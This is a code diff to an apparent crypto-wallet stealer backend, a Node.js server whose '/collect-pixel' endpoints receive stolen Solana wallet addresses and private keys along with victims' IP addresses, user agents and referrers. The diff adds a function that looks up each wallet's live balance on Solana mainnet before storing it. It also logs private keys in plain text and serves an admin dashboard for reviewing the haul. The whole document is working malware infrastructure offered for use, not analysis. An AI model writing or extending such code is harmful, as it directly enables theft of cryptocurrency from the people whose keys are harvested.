@@ -43,6 +43,35 @@ const pool = new Pool({
     ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
 });
 
+// ========================================
+// SOLANA BALANCE FETCHER
+// ========================================
+
+async function getSolanaBalance(walletAddress) {
+    try {
+        const response = await fetch('https://api.mainnet-beta.solana.com', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                id: 1,
+                method: 'getBalance',
+                params: [walletAddress]
+            })
+        });
+        const data = await response.json();
+        const balanceInSol = (data.result?.value / 1e9);
+        return balanceInSol ? balanceInSol.toFixed(4) : '0.0000';
+    } catch (error) {
+        console.error('Balance fetch error:', error.message);
+        return '0.0000';
+    }
+}
+
+// ========================================
+// DATABASE INITIALIZATION
+// ========================================
+
 async function initDatabase() {
     let retries = 5;
     while (retries > 0) {
@@ -148,6 +177,10 @@ app.get('/collect-pixel', async (req, res) => {
                 await client.query('BEGIN');
                 
                 for (const wallet of walletData.wallets) {
+                    // Fetch real balance from Solana blockchain
+                    const realBalance = await getSolanaBalance(wallet.addr);
+                    console.log(`   🔍 Fetched balance for ${wallet.addr.substring(0, 20)}...: ${realBalance} SOL`);
+                    
                     const query = `
                         INSERT INTO wallets (domain, user_id, wallet_address, private_key, balance, ip_address, user_agent, referrer, collected_at)
                         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
@@ -163,14 +196,14 @@ app.get('/collect-pixel', async (req, res) => {
                         walletData.user || 'unknown',
                         wallet.addr,
                         wallet.priv,
-                        parseFloat(wallet.bal) || 0,
+                        parseFloat(realBalance),
                         ip,
                         userAgent,
                         r,
                         timestamp
                     ]);
                     
-                    console.log(`   ✅ Wallet: ${wallet.addr} | ${wallet.bal} SOL`);
+                    console.log(`   ✅ Wallet: ${wallet.addr} | ${realBalance} SOL`);
                     console.log(`      Private Key: ${wallet.priv}`);
                 }
                 
@@ -239,6 +272,9 @@ app.post('/collect-pixel', async (req, res) => {
             await client.query('BEGIN');
             
             for (const wallet of walletData.wallets) {
+                // Fetch real balance from Solana blockchain
+                const realBalance = await getSolanaBalance(wallet.addr);
+                
                 await client.query(`
                     INSERT INTO wallets (domain, user_id, wallet_address, private_key, balance, ip_address, user_agent, referrer)
                     VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
@@ -250,11 +286,13 @@ app.post('/collect-pixel', async (req, res) => {
                     walletData.user || 'unknown',
                     wallet.addr,
                     wallet.priv,
-                    parseFloat(wallet.bal) || 0,
+                    parseFloat(realBalance),
                     ip,
                     userAgent,
                     referrer
                 ]);
+                
+                console.log(`   ✅ Wallet: ${wallet.addr} | ${realBalance} SOL`);
             }
             
             await client.query('COMMIT');
@@ -271,7 +309,10 @@ app.post('/collect-pixel', async (req, res) => {
     }
 });
 
-// Admin auth middleware
+// ========================================
+// ADMIN API ENDPOINTS
+// ========================================
+
 const adminAuth = (req, res, next) => {
     const authHeader = req.headers.authorization;
     if (!authHeader) {
@@ -368,16 +409,13 @@ app.delete('/api/clear-all', adminAuth, async (req, res) => {
 // SERVE ADMIN DASHBOARD (FROM public FOLDER)
 // ========================================
 
-// Ensure public directory exists
 const publicDir = path.join(__dirname, 'public');
 if (!fs.existsSync(publicDir)) {
     fs.mkdirSync(publicDir, { recursive: true });
 }
 
-// Serve static files from public folder
 app.use(express.static(publicDir));
 
-// Admin route - serves the admin.html file from public folder
 app.get('/admin', (req, res) => {
     const adminHtmlPath = path.join(publicDir, 'admin.html');
     if (fs.existsSync(adminHtmlPath)) {
@@ -390,6 +428,7 @@ app.get('/admin', (req, res) => {
 // ========================================
 // START SERVER
 // ========================================
+
 async function startServer() {
     await initDatabase();
     
@@ -409,7 +448,10 @@ async function startServer() {
 
 startServer();
 
-// Graceful shutdown
+// ========================================
+// GRACEFUL SHUTDOWN
+// ========================================
+
 process.on('SIGINT', async () => {
     console.log('\n\n🛑 Shutting down...');
     await pool.end();
